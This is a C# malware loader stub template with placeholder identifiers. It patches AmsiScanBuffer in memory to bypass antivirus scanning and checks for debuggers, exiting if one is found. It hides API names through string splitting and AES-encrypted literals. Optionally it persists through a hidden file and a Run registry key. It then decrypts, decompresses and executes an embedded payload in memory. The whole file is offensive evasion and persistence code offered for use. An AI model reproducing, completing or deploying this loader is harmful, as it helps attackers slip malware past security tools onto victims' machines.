using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace namepace_name
{
    internal class class_name
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

#if AMSI_BYPASS
        delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
#endif
#if ANTI_DEBUG
        delegate bool checkremotedebugger_name(IntPtr hProcess, ref bool isDebuggerPresent);
        delegate bool isdebuggerpresent_name();
#endif

        static void Main(string[] args)
        {
#if AMSI_BYPASS
            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
#elif ANTI_DEBUG
            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
#endif

#if ANTI_DEBUG
            IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("checkremotedebugger_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("isdebuggerpresent_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            checkremotedebugger_name CheckRemoteDebuggerPresent = (checkremotedebugger_name)Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(checkremotedebugger_name));
            isdebuggerpresent_name IsDebuggerPresent = (isdebuggerpresent_name)Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(isdebuggerpresent_name));
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);
#endif

#if AMSI_BYPASS
            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            byte[] patch;
            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint old;
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, asbaddr, patch.Length);
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);
#endif

#if STARTUP
            string filepath = Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null);
            string filecontent = File.ReadAllText(filepath);
            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\" + Path.GetFileName(filepath);
            if (File.Exists(startuppath))
            {
                File.SetAttributes(startuppath, FileAttributes.Normal);
                File.Delete(startuppath);
            }
            File.WriteAllText(startuppath, filecontent);
            File.SetAttributes(startuppath, FileAttributes.Hidden | FileAttributes.System);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", Path.GetFileName(startuppath), "cmd /c \"" + startuppath + "\"");
#endif

            Assembly asm = Assembly.GetExecutingAssembly();
            StreamReader reader = new StreamReader(asm.GetManifestResourceStream("payload.txt"));
            string payload = reader.ReadToEnd();
            reader.Dispose();

            MethodInfo entry = Assembly.Load(uncompressfunction_name(aesfunction_name(Convert.FromBase64String(payload), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")))).EntryPoint;
            try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
            catch { entry.Invoke(null, null); }
        }

        static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        static byte[] uncompressfunction_name(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }
    }
}